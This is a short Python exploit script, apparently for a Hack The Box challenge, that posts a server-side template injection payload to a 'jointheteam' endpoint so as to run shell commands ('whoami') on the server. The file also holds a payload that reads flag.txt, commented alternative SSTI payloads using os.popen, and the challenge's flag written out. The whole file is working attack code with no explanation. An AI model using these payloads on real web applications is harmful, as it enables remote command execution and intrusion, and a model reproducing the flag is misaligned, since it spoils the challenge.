#!/usr/bin/python3

import requests
import sys
from urllib.parse import quote

PAYLOAD = "{% import os %}{{os.popen('cat flag.txt').read()}}"
flag = "HTB{6M1ll1onD0ll4rD3v3l0p3r}"

def run_exploit(url):

    # ssti_payload = "{{ self.__TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}"
    # ssti_payload = "{% import os %}{{os.system('whoami')}}"
    ssti_payload = quote("{%")+"+"+"import+os"+"+"+quote("%}")+quote("{{os.system('whoami')}}")
    
    print(ssti_payload)
    ress = requests.post(url=url+"jointheteam", data=ssti_payload)
    print(ress.text)



def main():
    
    url = sys.argv[1]
    run_exploit(url)



if __name__ == "__main__":
    main()
